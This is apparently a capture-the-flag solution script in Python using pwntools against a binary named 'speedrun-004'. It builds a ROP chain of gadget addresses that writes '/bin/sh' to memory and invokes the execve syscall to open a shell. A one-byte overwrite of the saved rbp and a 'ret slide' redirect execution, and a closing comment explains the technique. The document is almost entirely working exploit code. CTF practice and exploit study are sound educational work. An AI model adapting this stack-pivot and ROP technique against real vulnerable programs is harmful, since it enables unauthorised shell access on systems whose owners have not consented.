#!/usr/bin/python 
from pwn import *

s = process ("./speedrun-004")

ret = 0x0000000000400416
syscall = 0x000000000040132c
pop_rax_ret = 0x0000000000415f04
pop_rdi_ret = 0x0000000000400686
pop_rsi_ret = 0x0000000000410a93
pop_rdx_ret = 0x000000000044a155
binsh = 0x0068732f6e69622f          # /bin/sh in hex
binsh_addr = 0x6b6030               # address to store /bin/sh 
execve = 0x3b                       # syscall number for execve 
mov = 0x000000000044788b            # mov qword ptr [rdi], rsi ; ret

# Write /bin/sh\x00 into memory
payload = ""
payload += p64(pop_rsi_ret)
payload += p64(binsh) 
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(mov)

# Call execve 
payload += p64(pop_rax_ret)
payload += p64(execve)
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(pop_rsi_ret)
payload += p64(0x0)
payload += p64(pop_rdx_ret)
payload += p64(0x0)
payload += p64(syscall)

#print (len(payload))
payload = p64(ret)*( ((0x100-len(payload)) / 8) ) + payload       # create a ret slide (just like nopsled) so it just keeps "reting" until it meets our ROP chain 

payload += "\x00"                   # rbp was pointing to 0x7fff383d4cd0, now it becomes 0x7fff383d4c00 

s.sendline("257")
s.sendline(payload)
s.interactive()

"""
    We can only overwrite 1 byte in rbp. We overwrite the least significant byte to point to our ret slide
    Because in the end there are the instructions: leave; ret (which is = mov esp, rbp; pop rbp; ret)
    When we return to the main function, RIP in main would be 0x7fff383d4c00+8 as 0x7fff383d4c00 is popped into RBP. This makes RIP points to our ret slide
"""
